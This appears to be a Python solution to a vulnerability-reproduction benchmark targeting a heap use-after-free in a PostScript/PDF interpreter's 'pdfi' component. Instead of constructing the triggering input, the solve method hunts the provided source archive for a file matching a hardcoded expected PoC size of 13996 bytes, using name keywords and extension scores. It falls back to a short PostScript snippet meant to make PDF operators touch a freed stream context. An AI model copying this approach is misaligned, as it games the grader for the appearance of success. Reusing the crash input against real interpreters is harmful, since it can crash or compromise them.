import os
import tarfile
import gzip
import lzma


class Solution:
    def _fallback_poc(self) -> bytes:
        poc = b"""%!PS-Adobe-3.0
%% Fallback PoC attempting to exercise PDF interpreter with missing input stream
(/nonexistent.pdf) (r) file
% Close the file immediately to try to invalidate the stream
dup closefile
% Try to start PDF interpreter on a bad/closed stream
/runpdfbegin where { pop runpdfbegin } if
% Call various PDF operators that may dereference the freed pdfi context
pdfpagecount
{ pdfpagecount } stopped pop
/runpdfend where { pop runpdfend } if
quit
"""
        return poc

    def solve(self, src_path: str) -> bytes:
        EXACT_POC_LEN = 13996

        tokens = [
            "poc",
            "heap",
            "uaf",
            "use-after-free",
            "use_after_free",
            "heap-use-after-free",
            "crash",
            "bug",
            "42280",
            "pdfi",
            "heapuaf",
        ]

        source_exts = {
            ".c",
            ".h",
            ".cpp",
            ".cc",
            ".cxx",
            ".hpp",
            ".py",
            ".pyc",
            ".pyo",
            ".sh",
            ".bash",
            ".zsh",
            ".java",
            ".js",
            ".ts",
            ".jsx",
            ".tsx",
            ".rb",
            ".pl",
            ".go",
            ".rs",
            ".php",
            ".cs",
            ".m",
            ".mm",
            ".swift",
            ".kt",
            ".kts",
            ".scala",
            ".clj",
            ".coffee",
            ".sql",
            ".erl",
            ".ex",
            ".exs",
            ".vb",
            ".vbs",
            ".fs",
            ".fsx",
            ".hxx",
            ".i",
            ".ii",
            ".ipp",
            ".inc",
            ".s",
            ".asm",
            ".bat",
            ".cmd",
            ".ps1",
            ".psm1",
            ".psd1",
            ".gradle",
            ".cmake",
            ".mak",
            ".mk",
            ".am",
            ".ac",
            ".m4",
            ".po",
            ".pot",
            ".rc",
            ".resx",
            ".xaml",
        }

        preferred_data_ext = {
            ".ps",
            ".pdf",
            ".eps",
            ".ai",
            ".poc",
            ".dat",
            ".bin",
            ".in",
            ".input",
            ".raw",
            ".ps1",
            ".ps2",
            ".pbm",
            ".pgm",
            ".ppm",
            ".bmp",
            ".tif",
            ".tiff",
            ".png",
            ".jpg",
            ".jpeg",
            ".gif",
            ".ico",
        }

        maybe_data_ext = {
            ".txt",
            ".md",
            ".rst",
            ".doc",
            ".docx",
        }

        compressed_exts = {".gz", ".xz"}

        def is_source_ext(name: str) -> bool:
            ext = os.path.splitext(name)[1].lower()
            return ext in source_exts

        def compute_score(member) -> float:
            name = member.name
            name_lower = name.lower()
            ext = os.path.splitext(name_lower)[1]
            score = 0.0

            if ext in preferred_data_ext:
                score += 8.0
            elif ext in maybe_data_ext or ext == "":
                score += 2.0
            elif is_source_ext(name):
                score -= 8.0

            for t in tokens:
                if t in name_lower:
                    score += 10.0

            size_diff = abs(member.size - EXACT_POC_LEN)
            score += max(0.0, 5.0 - (size_diff / 1024.0))

            if member.size > 5 * EXACT_POC_LEN:
                score -= 5.0

            depth = name.count("/")
            score -= depth * 0.2

            return score

        def read_member_data(tar_obj, member) -> bytes:
            try:
                f = tar_obj.extractfile(member)
                if f is None:
                    return b""
                data = f.read()
                if not isinstance(data, bytes):
                    data = bytes(data)
                return data
            except Exception:
                return b""

        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._fallback_poc()

        try:
            members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
        except Exception:
            tf.close()
            return self._fallback_poc()

        if not members:
            tf.close()
            return self._fallback_poc()

        # Stage 1: exact length, uncompressed
        best_member = None
        best_score = None
        for m in members:
            if m.size != EXACT_POC_LEN:
                continue
            score = compute_score(m)
            if best_member is None or score > best_score:
                best_member = m
                best_score = score

        if best_member is not None:
            data = read_member_data(tf, best_member)
            if data:
                tf.close()
                return data

        # Stage 2: near length (within +/- 4 KiB)
        best_member = None
        best_score = None
        size_threshold = 4096
        for m in members:
            if abs(m.size - EXACT_POC_LEN) > size_threshold:
                continue
            score = compute_score(m)
            if best_member is None or score > best_score:
                best_member = m
                best_score = score

        if best_member is not None:
            data = read_member_data(tf, best_member)
            if data:
                tf.close()
                return data

        # Stage 3: keyword-based candidates
        token_members = []
        for m in members:
            name_lower = m.name.lower()
            if any(t in name_lower for t in tokens):
                token_members.append(m)

        if token_members:
            best_member = max(token_members, key=compute_score)
            data = read_member_data(tf, best_member)
            if data:
                tf.close()
                return data

        # Stage 4: compressed (.gz / .xz) members whose decompressed size matches
        for m in members:
            name_lower = m.name.lower()
            ext = os.path.splitext(name_lower)[1]
            if ext not in compressed_exts:
                continue
            if m.size > 200000:
                continue
            comp_data = read_member_data(tf, m)
            if not comp_data:
                continue
            try:
                if ext == ".gz":
                    dec = gzip.decompress(comp_data)
                else:
                    dec = lzma.decompress(comp_data)
            except Exception:
                continue
            if len(dec) == EXACT_POC_LEN:
                tf.close()
                return dec

        # Stage 5: generic data-like file, prefer by score
        data_members = []
        for m in members:
            ext = os.path.splitext(m.name)[1].lower()
            if ext in preferred_data_ext or ext == "":
                data_members.append(m)

        if data_members:
            best_member = None
            best_score = None
            for m in data_members:
                score = compute_score(m)
                if best_member is None or score > best_score:
                    best_member = m
                    best_score = score
            data = read_member_data(tf, best_member)
            if data:
                tf.close()
                return data

        tf.close()
        return self._fallback_poc()
